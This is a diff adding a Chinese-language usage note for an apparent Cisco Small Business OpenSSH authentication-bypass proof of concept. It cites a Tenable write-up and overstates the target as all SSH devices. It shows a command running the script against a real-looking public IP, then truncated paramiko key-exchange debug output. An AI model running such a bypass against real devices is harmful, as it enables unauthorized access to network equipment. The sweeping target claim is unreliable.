@@ -1,0 +1,63 @@
+验证方式：验证文章
+文章链接：https://medium.com/tenable-techblog/an-old-cisco-openssh-bug-342ce6679f61
+目标产品：所有拥有ssh的设备
+
+poc用法：
+D:\Desktop>python small_business_sf_bypass.py 183.87.216.3 22 show version
+
+DEBUG:paramiko.transport:starting thread (client mode): 0x4ed00b08
+DEBUG:paramiko.transport:Local version/idstring: SSH-2.0-paramiko_2.7.1
+DEBUG:paramiko.transport:Remote version/idstring: SSH-2.0-OpenSSH_5.9p1.RL
+INFO:paramiko.transport:Connected (version 2.0, client OpenSSH_5.9p1.RL)
+DEBUG:paramiko.transport:Write packet <kexinit>, length 865
+DEBUG:paramiko.transport:OUT: 00 00 03 6C 0A 14 BC BE 64 B3 2E 07 B6 06 1C 32    ...l....d......2
+DEBUG:paramiko.transport:OUT: 87 7F C6 76 FE 5C 00 00 01 10 63 75 72 76 65 32    ...v.\....curve2
+DEBUG:paramiko.transport:OUT: 35 35 31 39 2D 73 68 61 32 35 36 40 6C 69 62 73    5519-sha256@libs
+DEBUG:paramiko.transport:OUT: 73 68 2E 6F 72 67 2C 65 63 64 68 2D 73 68 61 32    sh.org,ecdh-sha2
+DEBUG:paramiko.transport:OUT: 2D 6E 69 73 74 70 32 35 36 2C 65 63 64 68 2D 73    -nistp256,ecdh-s
+DEBUG:paramiko.transport:OUT: 68 61 32 2D 6E 69 73 74 70 33 38 34 2C 65 63 64    ha2-nistp384,ecd
+DEBUG:paramiko.transport:OUT: 68 2D 73 68 61 32 2D 6E 69 73 74 70 35 32 31 2C    h-sha2-nistp521,
+DEBUG:paramiko.transport:OUT: 64 69 66 66 69 65 2D 68 65 6C 6C 6D 61 6E 2D 67    diffie-hellman-g
+DEBUG:paramiko.transport:OUT: 72 6F 75 70 31 36 2D 73 68 61 35 31 32 2C 64 69    roup16-sha512,di
+DEBUG:paramiko.transport:OUT: 66 66 69 65 2D 68 65 6C 6C 6D 61 6E 2D 67 72 6F    ffie-hellman-gro
+DEBUG:paramiko.transport:OUT: 75 70 2D 65 78 63 68 61 6E 67 65 2D 73 68 61 32    up-exchange-sha2
+DEBUG:paramiko.transport:OUT: 35 36 2C 64 69 66 66 69 65 2D 68 65 6C 6C 6D 61    56,diffie-hellma
+DEBUG:paramiko.transport:OUT: 6E 2D 67 72 6F 75 70 31 34 2D 73 68 61 32 35 36    n-group14-sha256
+DEBUG:paramiko.transport:OUT: 2C 64 69 66 66 69 65 2D 68 65 6C 6C 6D 61 6E 2D    ,diffie-hellman-
+DEBUG:paramiko.transport:OUT: 67 72 6F 75 70 2D 65 78 63 68 61 6E 67 65 2D 73    group-exchange-s
+DEBUG:paramiko.transport:OUT: 68 61 31 2C 64 69 66 66 69 65 2D 68 65 6C 6C 6D    ha1,diffie-hellm
+DEBUG:paramiko.transport:OUT: 61 6E 2D 67 72 6F 75 70 31 34 2D 73 68 61 31 2C    an-group14-sha1,
+DEBUG:paramiko.transport:OUT: 64 69 66 66 69 65 2D 68 65 6C 6C 6D 61 6E 2D 67    diffie-hellman-g
+DEBUG:paramiko.transport:OUT: 72 6F 75 70 31 2D 73 68 61 31 00 00 00 57 73 73    roup1-sha1...Wss
+DEBUG:paramiko.transport:OUT: 68 2D 65 64 32 35 35 31 39 2C 65 63 64 73 61 2D    h-ed25519,ecdsa-
+DEBUG:paramiko.transport:OUT: 73 68 61 32 2D 6E 69 73 74 70 32 35 36 2C 65 63    sha2-nistp256,ec
+DEBUG:paramiko.transport:OUT: 64 73 61 2D 73 68 61 32 2D 6E 69 73 74 70 33 38    dsa-sha2-nistp38
+DEBUG:paramiko.transport:OUT: 34 2C 65 63 64 73 61 2D 73 68 61 32 2D 6E 69 73    4,ecdsa-sha2-nis
+DEBUG:paramiko.transport:OUT: 74 70 35 32 31 2C 73 73 68 2D 72 73 61 2C 73 73    tp521,ssh-rsa,ss
+DEBUG:paramiko.transport:OUT: 68 2D 64 73 73 00 00 00 57 61 65 73 31 32 38 2D    h-dss...Waes128-
+DEBUG:paramiko.transport:OUT: 63 74 72 2C 61 65 73 31 39 32 2D 63 74 72 2C 61    ctr,aes192-ctr,a
+DEBUG:paramiko.transport:OUT: 65 73 32 35 36 2D 63 74 72 2C 61 65 73 31 32 38    es256-ctr,aes128
+DEBUG:paramiko.transport:OUT: 2D 63 62 63 2C 61 65 73 31 39 32 2D 63 62 63 2C    -cbc,aes192-cbc,
+DEBUG:paramiko.transport:OUT: 61 65 73 32 35 36 2D 63 62 63 2C 62 6C 6F 77 66    aes256-cbc,blowf
+DEBUG:paramiko.transport:OUT: 69 73 68 2D 63 62 63 2C 33 64 65 73 2D 63 62 63    ish-cbc,3des-cbc
+DEBUG:paramiko.transport:OUT: 00 00 00 57 61 65 73 31 32 38 2D 63 74 72 2C 61    ...Waes128-ctr,a
+DEBUG:paramiko.transport:OUT: 65 73 31 39 32 2D 63 74 72 2C 61 65 73 32 35 36    es192-ctr,aes256
+DEBUG:paramiko.transport:OUT: 2D 63 74 72 2C 61 65 73 31 32 38 2D 63 62 63 2C    -ctr,aes128-cbc,
+DEBUG:paramiko.transport:OUT: 61 65 73 31 39 32 2D 63 62 63 2C 61 65 73 32 35    aes192-cbc,aes25
+DEBUG:paramiko.transport:OUT: 36 2D 63 62 63 2C 62 6C 6F 77 66 69 73 68 2D 63    6-cbc,blowfish-c
+DEBUG:paramiko.transport:OUT: 62 63 2C 33 64 65 73 2D 63 62 63 00 00 00 83 68    bc,3des-cbc....h
+DEBUG:paramiko.transport:OUT: 6D 61 63 2D 73 68 61 32 2D 32 35 36 2C 68 6D 61    mac-sha2-256,hma
+DEBUG:paramiko.transport:OUT: 63 2D 73 68 61 32 2D 35 31 32 2C 68 6D 61 63 2D    c-sha2-512,hmac-
+DEBUG:paramiko.transport:OUT: 73 68 61 32 2D 32 35 36 2D 65 74 6D 40 6F 70 65    sha2-256-etm@ope
+DEBUG:paramiko.transport:OUT: 6E 73 73 68 2E 63 6F 6D 2C 68 6D 61 63 2D 73 68    nssh.com,hmac-sh
+DEBUG:paramiko.transport:OUT: 61 32 2D 35 31 32 2D 65 74 6D 40 6F 70 65 6E 73    a2-512-etm@opens
+DEBUG:paramiko.transport:OUT: 73 68 2E 63 6F 6D 2C 68 6D 61 63 2D 73 68 61 31    sh.com,hmac-sha1
+DEBUG:paramiko.transport:OUT: 2C 68 6D 61 63 2D 6D 64 35 2C 68 6D 61 63 2D 73    ,hmac-md5,hmac-s
+DEBUG:paramiko.transport:OUT: 68 61 31 2D 39 36 2C 68 6D 61 63 2D 6D 64 35 2D    ha1-96,hmac-md5-
+DEBUG:paramiko.transport:OUT: 39 36 00 00 00 83 68 6D 61 63 2D 73 68 61 32 2D    96....hmac-sha2-
+DEBUG:paramiko.transport:OUT: 32 35 36 2C 68 6D 61 63 2D 73 68 61 32 2D 35 31    256,hmac-sha2-51
+DEBUG:paramiko.transport:OUT: 32 2C 68 6D 61 63 2D 73 68 61 32 2D 32 35 36 2D    2,hmac-sha2-256-
+DEBUG:paramiko.transport:OUT: 65 74 6D 40 6F 70 65 6E 73 73 68 2E 63 6F 6D 2C    etm@openssh.com,
+DEBUG:paramiko.transport:OUT: 68 6D 61 63 2D 73 68 61 32 2D 35 31 32 2D 65 74    hmac-sha2-512-et
+DEBUG:paramiko.transport:OUT: 6D 40 6F 70 65 6E 73 73 68 2E 63 6F 6D 2C 68 6D    m@openssh.com,hm
+...
